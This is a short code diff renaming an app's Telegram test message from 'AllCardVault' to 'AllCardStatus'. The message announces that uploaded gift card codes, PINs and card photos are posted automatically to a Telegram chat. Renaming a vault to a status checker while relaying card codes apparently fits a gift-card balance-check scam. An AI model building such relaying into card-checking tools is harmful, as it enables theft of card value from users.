@@ -255,7 +255,7 @@ export async function sendTelegramTestMessage(customToken?: string, customChatId
     };
   }
 
-  const text = `🎉 *AllCardVault Telegram Bot Test*\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\n⏰ *Connected:* ${new Date().toUTCString()}`;
+  const text = `🎉 *AllCardStatus Telegram Bot Test*\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\n⏰ *Connected:* ${new Date().toUTCString()}`;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -274,7 +274,7 @@ export async function sendTelegramTestMessage(customToken?: string, customChatId
     }
 
     // Retry with plain text
-    const plainText = `🎉 AllCardVault Telegram Bot Test\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\nConnected: ${new Date().toUTCString()}`;
+    const plainText = `🎉 AllCardStatus Telegram Bot Test\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts to this chat.\n\nConnected: ${new Date().toUTCString()}`;
     const fallbackResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
